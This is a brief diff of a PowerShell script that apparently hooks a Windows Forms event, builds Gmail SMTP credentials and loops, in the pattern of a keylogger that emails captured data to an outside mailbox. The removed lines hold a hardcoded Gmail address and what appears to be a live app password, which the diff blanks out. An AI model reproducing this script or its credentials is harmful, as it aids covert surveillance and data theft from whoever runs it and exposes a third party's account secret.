@@ -7,8 +7,8 @@ Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::FromHandle((Ge
 
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = 587
-$Username = "majiinbuu82@gmail.com"
-$Password = ConvertTo-SecureString "cmie vtae uqsh rsug" -AsPlainText -Force
+$Username = "@gmail.com"
+$Password = ConvertTo-SecureString "" -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential($Username, $Password)
 
 while ($true) {
